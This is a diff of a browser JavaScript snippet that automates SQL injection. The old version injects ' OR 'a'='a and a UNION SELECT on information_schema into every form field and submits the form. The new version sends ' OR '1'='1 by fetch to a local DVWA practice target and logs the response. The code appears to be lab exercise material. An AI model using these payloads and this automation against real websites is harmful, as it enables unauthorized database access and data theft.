@@ -1,40 +1,31 @@
-(function() {
-  // Log to confirm the script is running
-  console.log("SQL Injection script running...");
+(async function() {
+  console.log("Starting manual SQL injection...");
 
-  const sqlPayloads = [
-    "' OR 'a'='a",  // First payload
-    "' UNION SELECT table_name, column_name FROM information_schema.columns --"  // Second payload
-  ];
+  const sqlPayload = "' OR '1'='1";  // classic SQLi
 
-  const formInputs = document.querySelectorAll('input, textarea');
-  
-  formInputs.forEach(input => {
-    console.log(`Injecting payload into input: ${input.name || input.id}`);
-    input.value = sqlPayloads[0];  // Use the first payload from the array
+  // Build the URL manually
+  const targetUrl = "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=" + encodeURIComponent(sqlPayload) + "&Submit=Submit";
 
-    // Add event listener to handle form submission
-    input.addEventListener('input', function() {
-      const form = document.querySelector('form');
-      if (form) {
-        console.log("Form found, preventing default submission...");
-        // Prevent default form submission (page reload)
-        form.addEventListener('submit', function(e) {
-          e.preventDefault();
-          console.log("Form submission prevented.");
-        }, { once: true });
-        
-        console.log("Form is being submitted...");
-        form.submit();  // Submit the form
-      }
+  try {
+    const response = await fetch(targetUrl, {
+      method: 'GET',
+      credentials: 'include'  // needed to send cookies/session
     });
-  });
 
-  setTimeout(() => {
-    const form = document.querySelector('form');
-    if (form) {
-      console.log("Submitting form after timeout...");
-      form.submit();
+    const html = await response.text();
+    console.log("Response received:");
+    console.log(html);
+
+    // Optional: parse and extract only the interesting parts
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(html, 'text/html');
+    const result = doc.querySelector('pre, .vulnerable_code_area, #main_body'); // tweak as needed
+    if (result) {
+      console.log("Extracted result:", result.textContent);
+    } else {
+      console.log("Could not find specific result element.");
     }
-  }, 2000);  // Delay in milliseconds (2 seconds)
+  } catch (error) {
+    console.error("Fetch failed:", error);
+  }
 })();
